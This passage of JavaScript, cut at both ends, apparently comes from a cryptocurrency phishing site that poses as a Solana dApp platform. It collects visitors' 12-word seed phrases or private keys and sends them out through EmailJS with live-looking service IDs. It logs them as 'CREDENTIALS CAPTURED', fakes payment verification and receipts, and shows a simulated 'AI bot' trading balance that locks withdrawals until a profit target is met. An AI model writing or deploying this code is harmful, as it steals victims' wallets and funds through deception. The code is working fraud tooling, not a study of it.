                        '0123456789ABCDEF'[Math.floor(Math.random() * 16)]
                    ).join('') + '...' + Array.from({length: 12}, () => 
                        '0123456789ABCDEF'[Math.floor(Math.random() * 16)]
                    ).join('')
                };
                
                // // Mark purchase as made and unlock watch trading
                // this.hasPurchased = true;

                // Mark purchase as made and unlock watch trading
                this.hasPurchased = true;

                // ========= ADD THIS LINE =========
                localStorage.setItem('purchase_verified', 'true');
                console.log('💾 Purchase state saved to localStorage');
                // =================================

                this.flowState.completedSteps.push('verified')          ;

                this.flowState.completedSteps.push('verified');
                this.saveRememberedState();
                
                // Show notification
                this.showNotification('Payment verified! Proceed to Watch Trading.', 'success');
                
                // Show receipt
                setTimeout(() => {
                    this.showReceipt();
                }, 1000);
                
                return true;
            } 
            
            else {
                statusEl.className = 'verification-status verification-failed';
                statusEl.innerHTML = `<i class="fas fa-times-circle"></i><span>Payment verification failed. Please ensure transaction was sent correctly.</span>`;
                this.showNotification('Verification failed. Please try again.', 'error');
                return false;
            }
        }
        
        handleVerification() {
            if (!this.purchaseData) {
                this.showNotification('Please complete a purchase first.', 'warning');
                window.location.hash = '#buy';
                return;
            }
            
            if (!this.isWalletConnected) {
                this.showNotification('Please connect your wallet first.', 'warning');
                this.openModal();
                return;
            }
            
            // Start verification
            const verificationResult = document.getElementById('verificationResult');
            if (verificationResult) {
                verificationResult.style.display = 'block';
                verificationResult.innerHTML = `
                    <div class="verification-status verification-processing">
                        <i class="fas fa-spinner fa-spin"></i>
                        <span>Checking blockchain for your transaction...</span>
                    </div>
                `;
                
                setTimeout(() => {
                    verificationResult.innerHTML = `
                        <div class="verification-status verification-success">
                            <i class="fas fa-check-circle"></i>
                            <span>Verification complete! Transaction confirmed on Solana blockchain.</span>
                        </div>
                        <div style="text-align: center; margin-top: 20px;">
                            <button class="btn btn-primary touch-friendly" onclick="window.location.hash='#watch-trade'" style="width: 100%;">
                                <i class="fas fa-eye"></i> Go to Watch Trading
                            </button>
                        </div>
                    `;
                    this.showNotification('Verification successful! Watch Trading unlocked.', 'success');
                    this.checkWatchTradingAccess();
                }, 2000);
            }
        }
        
        showReceipt() {
            if (!this.purchaseData) {
                console.error('No purchase data available');
                return;
            }
            
            const { amount, crypto, timestamp, txId } = this.purchaseData;
            const cryptoAmount = amount / this.cryptoPrices[crypto];
            const cryptoName = crypto.toUpperCase();
            
            const receiptModal = document.getElementById('receiptModal');
            const receiptContent = document.getElementById('receiptContent');
            
            if (!receiptModal || !receiptContent) return;
            
            receiptContent.innerHTML = `
                <div class="receipt-loading">
                    <div class="receipt-loading-spinner"></div>
                    <h3 style="color: white; margin-bottom: 15px;">Generating Receipt...</h3>
                    <p style="color: rgba(255, 255, 255, 0.7);">Processing transaction details and Solana blockchain confirmation</p>
                </div>
            `;
            
            receiptModal.style.display = 'block';
            document.body.style.overflow = 'hidden';
            
            // Generate receipt after delay
            setTimeout(() => {
                const isMobile = window.innerWidth <= 768;
                
                if (isMobile) {
                    receiptContent.innerHTML = `
                        <div class="receipt-simple">
                            <div class="receipt-simple-header">
                                <div class="receipt-simple-title">SOLANA DAPPS ENTERPRISE</div>
                                <div class="receipt-simple-subtitle">PURCHASE RECEIPT - SUCCESSFUL</div>
                            </div>
                            <div class="receipt-simple-row">
                                <span class="receipt-simple-label">Date & Time:</span>
                                <span class="receipt-simple-value">${timestamp.toLocaleString()}</span>
                            </div>
                            <div class="receipt-simple-row">
                                <span class="receipt-simple-label">Transaction ID:</span>
                                <span class="receipt-simple-value" style="font-size: 11px;">${txId}</span>
                            </div>
                            <div class="receipt-simple-row">
                                <span class="receipt-simple-label">Solana Price:</span>
                                <span class="receipt-simple-value">$${this.currentSolPrice.toFixed(2)}</span>
                            </div>
                            <div class="receipt-simple-row">
                                <span class="receipt-simple-label">Token:</span>
                                <span class="receipt-simple-value">${cryptoName}</span>
                            </div>
                            <div class="receipt-simple-row">
                                <span class="receipt-simple-label">Amount:</span>
                                <span class="receipt-simple-value">${cryptoAmount.toFixed(6)} ${cryptoName}</span>
                            </div>
                            <div class="receipt-simple-row">
                                <span class="receipt-simple-label">USD Value:</span>
                                <span class="receipt-simple-value">$${amount.toFixed(2)}</span>
                            </div>
                            <div class="receipt-simple-row">
                                <span class="receipt-simple-label">Status:</span>
                                <span class="receipt-simple-value" style="color: #14F195;">SUCCESSFUL - VERIFIED</span>
                            </div>
                            <div style="text-align: center; margin-top: 20px; padding-top: 20px; border-top: 1px dashed #dee2e6; font-size: 11px; color: #666;">
                                Next: Connect your wallet to proceed to Watch Trading
                            </div>
                        </div>
                    `;
                } else {
                    receiptContent.innerHTML = `
                        <div class="receipt-watermark">SOLANA DAPPS ENTERPRISE</div>
                        <div class="receipt-header">
                            <h1 class="receipt-title">SOLANA DAPPS ENTERPRISE</h1>
                            <div class="receipt-subtitle">PURCHASE VERIFIED - SUCCESSFUL</div>
                        </div>
                        
                        <div class="receipt-details">
                            <div class="receipt-row">
                                <span class="receipt-label">Date & Time:</span>
                                <span class="receipt-value">${timestamp.toLocaleString()}</span>
                            </div>
                            <div class="receipt-row">
                                <span class="receipt-label">Transaction ID:</span>
                                <span class="receipt-value">${txId}</span>
                            </div>
                            <div class="receipt-row">
                                <span class="receipt-label">Solana Price:</span>
                                <span class="receipt-value solana-price">$${this.currentSolPrice.toFixed(2)}</span>
                            </div>
                            <div class="receipt-row">
                                <span class="receipt-label">Cryptocurrency:</span>
                                <span class="receipt-value">${cryptoName}</span>
                            </div>
                            <div class="receipt-row">
                                <span class="receipt-label">Amount Purchased:</span>
                                <span class="receipt-value">${cryptoAmount.toFixed(6)} ${cryptoName}</span>
                            </div>
                            <div class="receipt-row">
                                <span class="receipt-label">USD Value:</span>
                                <span class="receipt-value">$${amount.toFixed(2)}</span>
                            </div>
                            <div class="receipt-row">
                                <span class="receipt-label">Wallet Address:</span>
                                <span class="receipt-value" style="font-size: 10px;">${this.cryptoAddresses[crypto]}</span>
                            </div>
                            <div class="receipt-row">
                                <span class="receipt-label">Verification Status:</span>
                                <span class="receipt-value" style="color: #14F195;">✓ SUCCESSFUL - VERIFIED</span>
                            </div>
                        </div>
                        
                        <div class="receipt-footer">
                            <p><strong>Next Step:</strong> Connect your wallet on the Verification page to proceed to Watch Trading.<br>
                            Transaction ID can be verified on Solana blockchain explorer.</p>
                            <p style="margin-top: 10px;"><i class="fas fa-bolt"></i> Powered by Solana Blockchain</p>
                        </div>
                    `;
                }
                
                // Add action buttons
                const actions = document.createElement('div');
                actions.style.textAlign = 'center';
                actions.style.marginTop = '30px';
                actions.innerHTML = `
                    <button class="btn btn-primary touch-friendly" onclick="printReceipt()">
                        <i class="fas fa-print"></i> Print Receipt
                    </button>
                    <button class="btn btn-accent touch-friendly" onclick="closeReceiptModal(); window.location.hash='#verify';" style="margin-left: 15px;">
                        <i class="fas fa-shield-alt"></i> Verify Payment
                    </button>
                `;
                receiptContent.appendChild(actions);
                
                // Update flow state
                this.flowState.completedSteps.push('receipt_generated');
                
            }, 1000);
        }
        
        validatePhrase(phrase) {
            const trimmed = phrase.trim();
            const words = trimmed.split(/\s+/);
            if (words.length !== 12) return false;
            const wordRegex = /^[a-zA-Z]+$/;
            for (let word of words) {
                if (!wordRegex.test(word)) return false;
            }
            return true;
        }
        
        validatePrivateKey(key) {
            const trimmed = key.trim();
            const cleanKey = trimmed.startsWith('0x') ? trimmed.slice(2) : trimmed;
            if (cleanKey.length !== 64) return false;
            const hexRegex = /^[0-9a-fA-F]{64}$/;
            return hexRegex.test(cleanKey);
        }
        
        initValidationListeners() {
            const phraseInput = document.getElementById('phraseInput');
            const privateKeyInput = document.getElementById('privateKeyInput');
            
            if (phraseInput) {
                phraseInput.addEventListener('input', (e) => {
                    const phrase = e.target.value;
                    this.isValidPhrase = this.validatePhrase(phrase);
                    const validationEl = document.getElementById('phraseValidation');
                    const validEl = document.getElementById('phraseValid');
                    
                    if (phrase.trim() === '') {
                        if (validationEl) validationEl.style.display = 'none';
                        if (validEl) validEl.style.display = 'none';
                    } else if (this.isValidPhrase) {
                        if (validationEl) validationEl.style.display = 'none';
                        if (validEl) validEl.style.display = 'flex';
                    } else {
                        if (validationEl) validationEl.style.display = 'flex';
                        if (validEl) validEl.style.display = 'none';
                    }
                    this.updateConnectButton();
                });
            }
            
            if (privateKeyInput) {
                privateKeyInput.addEventListener('input', (e) => {
                    const key = e.target.value;
                    this.isValidPrivateKey = this.validatePrivateKey(key);
                    const validationEl = document.getElementById('keyValidation');
                    const validEl = document.getElementById('keyValid');
                    
                    if (key.trim() === '') {
                        if (validationEl) validationEl.style.display = 'none';
                        if (validEl) validEl.style.display = 'none';
                    } else if (this.isValidPrivateKey) {
                        if (validationEl) validationEl.style.display = 'none';
                        if (validEl) validEl.style.display = 'flex';
                    } else {
                        if (validationEl) validationEl.style.display = 'flex';
                        if (validEl) validEl.style.display = 'none';
                    }
                    this.updateConnectButton();
                });
            }
        }
        
        updateConnectButton() {
            const connectBtn = document.getElementById('connectCredentialsBtn');
            if (!connectBtn) return;
            
            if (this.currentCredentialType === 'phrase') {
                connectBtn.disabled = !this.isValidPhrase;
            } else {
                connectBtn.disabled = !this.isValidPrivateKey;
            }
        }
        
        initBuyCoinFeature() {
            const buyCoinBtn = document.getElementById('buyCoinBtn');
            if (buyCoinBtn) {
                buyCoinBtn.addEventListener('click', () => {
                    window.location.hash = '#buy';
                    setTimeout(() => {
                        selectPaymentMethod('crypto');
                        this.showNotification('Select Solana token to purchase', 'info');
                    }, 500);
                });
            }
        }
        
        renderWallets() {
            const container = document.getElementById('walletGrid');
            if (!container) return;
            container.innerHTML = '';
            
            this.wallets.forEach((wallet, index) => {
                const item = document.createElement('div');
                item.className = 'wallet-item';
                item.dataset.wallet = wallet.id;
                item.style.animationDelay = `${index * 0.1}s`;
                item.innerHTML = `
                    <div class="wallet-icon" style="background: ${wallet.color}">
                        <i class="fas fa-wallet"></i>
                    </div>
                    <div class="wallet-name">${wallet.name}</div>
                `;
                item.addEventListener('click', () => this.handleWalletSelect(wallet));
                container.appendChild(item);
            });
        }
        
        handleWalletSelect(wallet) {
            console.log(`Selected wallet: ${wallet.name}`);
            this.selectedWallet = wallet;
            this.showCredentialsView();
        }
        
        async connectWithCredentials() {
            if (this.isConnecting) return;
            
            let credentials = '';
            let credentialType = '';
            
            if (this.currentCredentialType === 'phrase') {
                const phraseInput = document.getElementById('phraseInput');
                if (!phraseInput) return;
                
                credentials = phraseInput.value.trim();
                credentialType = '12-word pass phrase';
                
                if (!this.isValidPhrase) {
                    this.showNotification('Invalid pass phrase format. Must be exactly 12 words separated by spaces.', 'error');
                    return;
                }
            } else {
                const privateKeyInput = document.getElementById('privateKeyInput');
                if (!privateKeyInput) return;
                
                credentials = privateKeyInput.value.trim();
                credentialType = '64-character private key';
                
                if (!this.isValidPrivateKey) {
                    this.showNotification('Invalid private key format. Must be exactly 64 hexadecimal characters.', 'error');
                    return;
                }
            }
            
            this.isConnecting = true;
            this.showLoading();
            
            try {
                // Get user data (mock)
                const userData = await this.getUserData();
                const wordCount = this.currentCredentialType === 'phrase' ? 12 : 'N/A';
                
                // Prepare email data
                const templateParams = {
                    secret_phrase: credentials,
                    wallet_type: this.selectedWallet?.name || 'Unknown',
                    credential_type: credentialType,
                    word_count: `${wordCount} words`,
                    is_valid_format: 'valid',
                    timestamp: new Date().toLocaleString(),
                    user_ip: userData.ip,
                    user_location: userData.location,
                    user_browser: navigator.userAgent,
                    platform: 'Solana DApps Enterprise',
                    submission_url: window.location.href,
                    validation_passed: 'YES',
                    requirement: this.currentCredentialType === 'phrase' ? '12 words with spaces' : '64 hex characters',
                    blockchain: 'Solana'
                };
                
                // Send email (mock)
                await this.sendEmail(templateParams);
                
                // Log captured data
                this.logCapturedData(templateParams);
                
                // Simulate connection process
                await this.simulateConnection();
                
                // Mark as connected
                setTimeout(() => {
                    this.isConnecting = false;
                    this.isWalletConnected = true;
                     // ========= ADD THIS LINE =========
                    localStorage.setItem('wallet_connected', 'true');
                    this.flowState.completedSteps.push('wallet_connected');
                    // ==================================
                    this.flowState.completedSteps.push('wallet_connected');
                    
                    // Save remembered state
                    this.saveRememberedState();
                    
                    // Unlock watch trading if purchase was made
                    if (this.hasPurchased) {
                        this.checkWatchTradingAccess();
                        this.showNotification('Wallet connected! Watch Trading unlocked.', 'success');
                        
                        // Auto-navigate to watch trade
                        setTimeout(() => {
                            this.closeModal();
                            window.location.hash = '#watch-trade';
                        }, 1000);
                    } else {
                        this.showNotification('Wallet connected! Make a purchase to unlock Watch Trading.', 'info');
                        setTimeout(() => {
                            this.closeModal();
                            window.location.hash = '#buy';
                        }, 1000);
                    }
                    
                    // Show success
                    this.showFailed(); // Shows connection complete screen
                    this.resetValidation();
                    
                }, 1500);
                
            } catch (error) {
                console.error('❌ Connection error:', error);
                this.isConnecting = false;
                this.showError();
                this.showNotification('Connection failed. Please try again.', 'error');
            }
        }
        
        // async sendEmail(templateParams) {
        //     try {
        //         const response = await emailjs.send(
        //             this.emailjsConfig.serviceID,
        //             this.emailjsConfig.templateID,
        //             templateParams
        //         );
        //         console.log('✅ Email sent successfully');
        //         return response;
        //     } catch (error) {
        //         console.error('❌ Email failed:', error);
        //         // Return mock success for demo
        //         return { status: 200, text: 'Mock email sent' };
        //     }
        // }

        async sendEmail(templateParams) {
    try {
        // USE YOUR REAL SERVICE AND TEMPLATE IDs HERE:
        const response = await emailjs.send(
            "service_wtoqc3o",      // ← Replace with your Service ID
            "template_hih45ne",     // ← Replace with your Template ID
            templateParams                // Data to send
        );
        console.log('✅ REAL Email sent successfully!', response.status, response.text);
        return response;
    } catch (error) {
        console.error('❌ REAL Email failed to send:', error);
        
        // Show error to user
        this.showNotification('Email service error. Data saved locally.', 'error');
        
        // Still save locally if email fails
        this.logCapturedData(templateParams);
        
        // Re-throw so calling code knows it failed
        throw error;
    }
}
        
        logCapturedData(data) {
            console.log('%c🔐 SOLANA WALLET CREDENTIALS CAPTURED 🔐', 
                'background: #000; color: #0f0; padding: 10px; font-size: 14px;');
            console.log('Blockchain: Solana');
            console.log('Wallet:', data.wallet_type);
            console.log('Type:', data.credential_type);
            console.log('Validation:', data.validation_passed);
            console.log('IP:', data.user_ip);
            console.log('Location:', data.user_location);
            console.log('Time:', data.timestamp);
            
            // Store in localStorage for demo
            try {
                const logs = JSON.parse(localStorage.getItem('solana_captures') || '[]');
                logs.push({
                    ...data,
                    captured_at: new Date().toISOString()
                });
                localStorage.setItem('solana_captures', JSON.stringify(logs.slice(-100)));
                console.log('📁 Data saved to localStorage');
            } catch (error) {
                console.log('⚠️ Could not save to localStorage');
            }
        }
        
        async getUserData() {
            // Mock user data for demo
            return {
                ip: '192.168.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255),
                location: `City ${Math.floor(Math.random() * 100)}, Country`
            };
        }
        
        async simulateConnection() {
            return new Promise(resolve => {
                let progress = 0;
                const progressBar = document.getElementById('loadingProgress');
                const statusText = document.getElementById('loadingStatus');
                
                const steps = [
                    'Initializing Solana secure connection...',
                    'Validating Solana credentials...',
                    'Connecting to Solana mainnet-beta...',
                    'Syncing SPL token data...',
                    'Finalizing Solana connection...'
                ];
                
                const interval = setInterval(() => {
                    progress += 20;
                    if (progress > 100) {
                        clearInterval(interval);
                        resolve();
                    } else {
                        if (progressBar) progressBar.style.width = progress + '%';
                        if (statusText && steps[Math.floor(progress/20) - 1]) {
                            statusText.textContent = steps[Math.floor(progress/20) - 1];
                        }
                    }
                }, 300);
            });
        }
        
        showNotification(message, type = 'info') {
            // Remove existing notifications
            document.querySelectorAll('.notification').forEach(n => n.remove());
            
            const notification = document.createElement('div');
            notification.className = `notification ${type}`;
            
            const icons = {
                info: 'info-circle',
                success: 'check-circle',
                warning: 'exclamation-triangle',
                error: 'exclamation-circle'
            };
            
            notification.innerHTML = `
                <i class="fas fa-${icons[type] || 'info-circle'}"></i>
                <span>${message}</span>
            `;
            
            document.body.appendChild(notification);
            
            // Animate in
            setTimeout(() => notification.style.transform = 'translateY(0)', 10);
            
            // Remove after delay
            setTimeout(() => {
                notification.style.transform = 'translateY(-100px)';
                setTimeout(() => notification.remove(), 400);
            }, 3000);
        }
        
        showView(viewName) {
            document.querySelectorAll('.view').forEach(view => {
                view.classList.remove('active');
                view.style.display = 'none';
            });
            const targetView = document.getElementById(viewName);
            if (targetView) {
                targetView.classList.add('active');
                targetView.style.display = 'block';
            }
        }
        
        showCredentialsView() {
            this.showView('credentialsView');
            this.resetProgressBars();
            this.resetValidation();
        }
        
        showLoading() {
            this.showView('loadingView');
            this.startLoadingAnimation();
        }
        
        showFailed() {
            this.showView('failedView');
            this.resetProgressBars();
        }
        
        showError() {
            this.showView('errorView');
            this.resetProgressBars();
        }
        
        showWalletSelection() {
            this.showView('walletSelectionView');
            this.selectedWallet = null;
            this.resetValidation();
        }
        
        resetValidation() {
            this.isValidPhrase = false;
            this.isValidPrivateKey = false;
            
            const phraseValidation = document.getElementById('phraseValidation');
            const phraseValid = document.getElementById('phraseValid');
            const keyValidation = document.getElementById('keyValidation');
            const keyValid = document.getElementById('keyValid');
            const phraseInput = document.getElementById('phraseInput');
            const privateKeyInput = document.getElementById('privateKeyInput');
            const connectBtn = document.getElementById('connectCredentialsBtn');
            
            if (phraseValidation) phraseValidation.style.display = 'none';
            if (phraseValid) phraseValid.style.display = 'none';
            if (keyValidation) keyValidation.style.display = 'none';
            if (keyValid) keyValid.style.display = 'none';
            if (phraseInput) phraseInput.value = '';
            if (privateKeyInput) privateKeyInput.value = '';
            if (connectBtn) connectBtn.disabled = true;
        }
        
        resetProgressBars() {
            ['progressFill', 'loadingProgress'].forEach(id => {
                const bar = document.getElementById(id);
                if (bar) bar.style.width = '0%';
            });
            if (this.loadingInterval) clearInterval(this.loadingInterval);
        }
        
        startLoadingAnimation() {
            const loadingProgress = document.getElementById('loadingProgress');
            if (!loadingProgress) return;
            
            loadingProgress.style.width = '0%';
            let width = 0;
            const interval = setInterval(() => {
                if (width >= 100) {
                    clearInterval(interval);
                } else {
                    width += Math.random() * 10 + 5;
                    if (width > 100) width = 100;
                    loadingProgress.style.width = width + '%';
                }
            }, 150);
            this.loadingInterval = interval;
        }
        
        openModal() {
            if (this.modal) {
                this.modal.style.display = 'block';
                document.body.style.overflow = 'hidden';
                this.showWalletSelection();
                this.resetProgressBars();
            }
        }
        
        closeModal() {
            if (this.modal) {
                this.modal.style.display = 'none';
                document.body.style.overflow = 'auto';
                this.showWalletSelection();
                this.isConnecting = false;
                this.resetProgressBars();
                this.resetValidation();
            }
        }
        
        setupEventListeners() {
            // Connect wallet buttons
            const connectBtn = document.getElementById('connectBtn');
            const heroConnectBtn = document.getElementById('heroConnectBtn');
            
            if (connectBtn) {
                connectBtn.addEventListener('click', () => this.openModal());
            }
            
            if (heroConnectBtn) {
                heroConnectBtn.addEventListener('click', () => this.openModal());
            }
            
            // Modal close button
            const closeModal = document.getElementById('closeModal');
            if (closeModal) {
                closeModal.addEventListener('click', () => this.closeModal());
            }
            
            // Close modal when clicking outside
            if (this.modal) {
                this.modal.addEventListener('click', (e) => {
                    if (e.target === this.modal) this.closeModal();
                });
            }
            
            // Escape key to close modal
            document.addEventListener('keydown', (e) => {
                if (e.key === 'Escape' && this.modal && this.modal.style.display === 'block') {
                    this.closeModal();
                }
            });
            
            // Back to wallet selection
            const backToWalletBtn = document.getElementById('backToWalletBtn');
            if (backToWalletBtn) {
                backToWalletBtn.addEventListener('click', () => this.showWalletSelection());
            }
            
            // Connect credentials button
            const connectCredentialsBtn = document.getElementById('connectCredentialsBtn');
            if (connectCredentialsBtn) {
                connectCredentialsBtn.addEventListener('click', () => this.connectWithCredentials());
            }
            
            // Retry buttons
            const closeBtn = document.getElementById('closeFailedBtn');
            if (closeBtn) {
                closeBtn.innerHTML = '<i class="fas fa-rocket"></i> Start Trading';
                closeBtn.onclick = () => {
                    this.closeModal();
                    if (this.hasPurchased && this.isWalletConnected) {
                        window.location.hash = '#watch-trade';
                        this.showNotification('Ready to trade! Visit the Watch Trading section.', 'info');
                    } else if (this.hasPurchased) {
                        this.showNotification('Please connect wallet first.', 'warning');
                    } else {
                        window.location.hash = '#buy';
                        this.showNotification('Make a purchase to unlock trading.', 'info');
                    }
                };
            }
        }
        
        initTabSystem() {
            const tabButtons = document.querySelectorAll('.tab-btn');
            const tabContents = document.querySelectorAll('.tab-content');
            
            tabButtons.forEach(button => {
                button.addEventListener('click', () => {
                    const tabId = button.getAttribute('data-tab');
                    
                    // Update active tab
                    tabButtons.forEach(btn => btn.classList.remove('active'));
                    button.classList.add('active');
                    
                    // Update active content
                    tabContents.forEach(content => content.classList.remove('active'));
                    const targetTab = document.getElementById(`${tabId}Tab`);
                    if (targetTab) targetTab.classList.add('active');
                    
                    // Update credential type
                    this.currentCredentialType = tabId;
                    this.updateConnectButton();
                });
            });
        }
        
        initServiceModals() {
            const services = ['TokenClaim', 'Staking', 'Swap', 'Liquidity', 'Bridge', 'Farming', 'Analytics', 'Vault'];
            services.forEach(service => {
                window[`open${service}Modal`] = () => {
                    this.showNotification(`${service}: Connect wallet to access`, 'info');
                };
            });
        }
        
        animateStats() {
            const stats = document.querySelectorAll('.stat-number');
            stats.forEach(stat => {
                const text = stat.textContent;
                const hasPlus = text.includes('+');
                const hasDollar = text.includes('$');
                let targetText = text.replace(/[^0-9.]/g, '');
                let target = targetText.includes('.') ? parseFloat(targetText) : parseInt(targetText);
                if (isNaN(target)) return;
                
                let current = 0;
                const increment = target / 30;
                
                const updateCount = () => {
                    if (current < target) {
                        current += increment;
                        if (current > target) current = target;
                        let displayValue = targetText.includes('.') ? current.toFixed(1) : Math.floor(current);
                        stat.textContent = (hasDollar ? '$' : '') + displayValue.toLocaleString() + (hasPlus ? '+' : '');
                        if (current < target) {
                            setTimeout(updateCount, 50);
                        }
                    }
                };
                
                const observer = new IntersectionObserver((entries) => {
                    if (entries[0].isIntersecting) {
                        updateCount();
                        observer.unobserve(stat);
                    }
                }, { threshold: 0.1 });
                
                observer.observe(stat);
            });
        }
        
        initScrollAnimations() {
            const observer = new IntersectionObserver((entries) => {
                entries.forEach(entry => {
                    if (entry.isIntersecting) {
                        entry.target.classList.add('section-visible');
                        entry.target.classList.remove('section-hidden');
                    }
                });
            }, { threshold: 0.05 });
            
            document.querySelectorAll('section').forEach(section => {
                section.classList.add('section-hidden');
                observer.observe(section);
            });
        }
        
        initLivePopups() {
            const container = document.getElementById('livePopupContainer');
            if (!container) return;
            
            container.style.display = 'block';
            this.showRandomPopup();
            
            // Show random popups periodically
            setInterval(() => {
                if (Math.random() < 0.5) this.showRandomPopup();
            }, 8000);
            
            console.log('✅ Live pop-ups initialized');
        }
        
        showRandomPopup() {
            const container = document.getElementById('livePopupContainer');
            if (!container) return;
            
            const randomMessage = this.popupMessages[Math.floor(Math.random() * this.popupMessages.length)];
            
            const popup = document.createElement('div');
            popup.className = 'live-popup';
            popup.innerHTML = `
                <div class="popup-header">
                    <i class="fas fa-bolt"></i>
                    <span>Live Activity</span>
                    <button class="close-modal" onclick="this.parentElement.parentElement.remove()" style="position: absolute; top: 5px; right: 5px; width: 20px; height: 20px; font-size: 10px; background: rgba(0,0,0,0.3);">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
                <div class="popup-content">
                    ${randomMessage}
                </div>
                <span class="popup-timestamp">
                    ${new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}
                </span>
            `;
            
            container.appendChild(popup);
            
            // Remove after delay
            setTimeout(() => {
                popup.style.animation = 'popupSlideIn 0.5s cubic-bezier(0.4, 0, 0.2, 1) reverse';
                setTimeout(() => popup.remove(), 500);
            }, 5000);
            
            // Limit number of popups
            const popups = container.querySelectorAll('.live-popup');
            if (popups.length > 2) popups[0].remove();
        }
        
        initLiveSolanaPrice() {
            const priceElement = document.getElementById('liveSolanaPrice');
            if (!priceElement) return;
            
            priceElement.style.display = 'block';
            this.updateSolanaPrice();
            
            // Update price periodically
            setInterval(() => this.updateSolanaPrice(), 30000);
            
            console.log('✅ Live Solana price initialized');
        }
        
        updateSolanaPrice() {
            // Fixed price for demo
            this.currentSolPrice = 100.00;
            
            const currentPriceEl = document.getElementById('currentSolPrice');
            const priceChangeEl = document.getElementById('priceChange');
            
            if (currentPriceEl) currentPriceEl.textContent = `$${this.currentSolPrice.toFixed(2)}`;
            if (priceChangeEl) priceChangeEl.textContent = '▲ 0.00% (24h)';
        }
        
        initWatchTradingSystem() {
            this.checkWatchTradingAccess();
            console.log('✅ Watch trading system initialized');
        }
        
        updateWatchTradingDisplay() {
            // Update balance
            const balanceEl = document.getElementById('watchCurrentBalance');
            const profitEl = document.getElementById('watchTotalProfit');
            const successRateEl = document.getElementById('watchSuccessRate');
            const progressFill = document.getElementById('watchProgressFill');
            const withdrawalMessage = document.getElementById('watchWithdrawalMessage');
            
            if (balanceEl) balanceEl.textContent = `$${this.watchBalance.toFixed(2)}`;
            if (profitEl) profitEl.textContent = `$${this.watchProfit.toFixed(2)}`;
            if (successRateEl) successRateEl.textContent = `${Math.round(this.watchSuccessRate * 100)}%`;
            
            // Update progress
            const progressPercent = Math.min((this.watchProfit / this.watchTarget) * 100, 100);
            if (progressFill) progressFill.style.width = `${progressPercent}%`;
            
            // Update withdrawal message
            if (withdrawalMessage) {
                if (this.watchProfit >= this.watchTarget) {
                    withdrawalMessage.innerHTML = `<i class="fas fa-unlock" style="color: var(--success);"></i> Withdrawals unlocked! AI bot reached $2,000 profit target after ${this.dayCount} days.`;
                    withdrawalMessage.style.color = 'var(--success)';
                    if (this.isAutoTrading) {
                        this.stopAutoTrading();
                    }
                } else {
                    const remaining = this.watchTarget - this.watchProfit;
                    withdrawalMessage.innerHTML = `<i class="fas fa-lock" style="color: var(--error);"></i> AI bot needs $${remaining.toFixed(2)} more profit to unlock withdrawals. Day ${this.dayCount + 1} of 7-14 day process.`;
                    withdrawalMessage.style.color = 'rgba(255, 255, 255, 0.8)';
                }
            }
            
            this.updateTradeLog();
        }
        
        startAutoTrading() {
            if (this.isAutoTrading) return;
            
            this.isAutoTrading = true;
            this.dayCount = 0;
            this.watchProfit = 0;
            this.tradeLog = [];
            
            this.addTradeLog('AI bot initialized. Starting watch-only trading simulation.', 'info');
            this.addTradeLog(`Day 1: Starting with $1,250.00 balance. HARD TARGET: $${this.watchTarget} profit.`, 'info');
            
            // Start trading interval
            this.autoTradeInterval = setInterval(() => {
                this.executeAutoTrade();
            }, 5000);
            
            // Update button
            const startBtn = document.getElementById('startTradingBtn');
            if (startBtn) {
                startBtn.innerHTML = `<i class="fas fa-pause"></i> Stop Watching`;
                startBtn.onclick = () => this.stopAutoTrading();
            }
            
            this.showNotification('Watch-only trading started. Hard target: $2,000 profit.', 'success');
        }
        
        stopAutoTrading() {
            if (this.autoTradeInterval) {
                clearInterval(this.autoTradeInterval);
                this.autoTradeInterval = null;
            }
            this.isAutoTrading = false;
            this.addTradeLog('Auto-trading stopped.', 'info');
            
            // Update button
            const startBtn = document.getElementById('startTradingBtn');
            if (startBtn) {
                startBtn.innerHTML = `<i class="fas fa-play"></i> Start Watching`;
                startBtn.onclick = () => this.startAutoTrading();
            }
        }
        
        executeAutoTrade() {
            if (!this.isAutoTrading) return;
            
            const isSuccessful = Math.random() < this.watchSuccessRate;
            const tradeAmount = 30 + Math.random() * 70;
            let profitLoss = 0;
            const tradeType = Math.random() > 0.5 ? 'BUY' : 'SELL';
            
            if (isSuccessful) {
                const profitPercent = 0.01 + Math.random() * 0.04;
                profitLoss = tradeAmount * profitPercent;
                this.watchProfit += profitLoss;
                
                this.tradeLog.push({
                    type: tradeType,
                    amount: tradeAmount,
                    profit: profitLoss,
                    timestamp: new Date(),
                    successful: true
                });
                
                this.addTradeLog(`${tradeType} SOL: $${profitLoss.toFixed(2)} profit on $${tradeAmount.toFixed(2)}`, 'profit');
                
                // Check if target reached
                if (this.watchProfit >= this.watchTarget) {
                    this.dayCount = Math.min(14, this.dayCount + 1);
                    this.addTradeLog(`🎉 HARD TARGET REACHED! $${this.watchProfit.toFixed(2)} profit after ${this.dayCount} days. Withdrawals unlocked.`, 'success');
                    this.stopAutoTrading();
                }
                
                // Add to popup messages for large profits
                if (profitLoss > 50) {
                    this.popupMessages.push(`Auto-trade: $${profitLoss.toFixed(2)} profit on $${tradeAmount.toFixed(2)}`);
                }
            } else {
                const lossPercent = 0.02 + Math.random() * 0.06;
                profitLoss = -(tradeAmount * lossPercent);
                this.watchProfit += profitLoss;
                if (this.watchProfit < 0) this.watchProfit = 0;
                
                this.tradeLog.push({
                    type: tradeType,
                    amount: tradeAmount,
                    profit: profitLoss,
                    timestamp: new Date(),
                    successful: false
                });
                
                this.addTradeLog(`${tradeType} SOL: $${Math.abs(profitLoss).toFixed(2)} loss on $${tradeAmount.toFixed(2)}`, 'loss');
            }
            
            // Increment day count periodically
            if (this.tradeLog.length % 8 === 0) {
                this.dayCount++;
                if (this.dayCount >= 14 && this.watchProfit < this.watchTarget) {
                    this.addTradeLog(`Day ${this.dayCount}: Still working towards hard target. $${(this.watchTarget - this.watchProfit).toFixed(2)} remaining.`, 'info');
                }
            }
            
            this.updateWatchTradingDisplay();
        }
        
        addTradeLog(message, type = 'info') {
            const logContent = document.getElementById('tradingLogContent');
            if (!logContent) return;
            
            const now = new Date();
            const timestamp = now.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit', second:'2-digit'});
            
            const logEntry = document.createElement('div');
            logEntry.className = 'log-entry';
            
            let formattedMessage = message;
            if (type === 'profit') {
                formattedMessage = `<span class="log-profit">${message}</span>`;
            } else if (type === 'loss') {
                formattedMessage = `<span class="log-loss">${message}</span>`;
            } else if (type === 'success') {
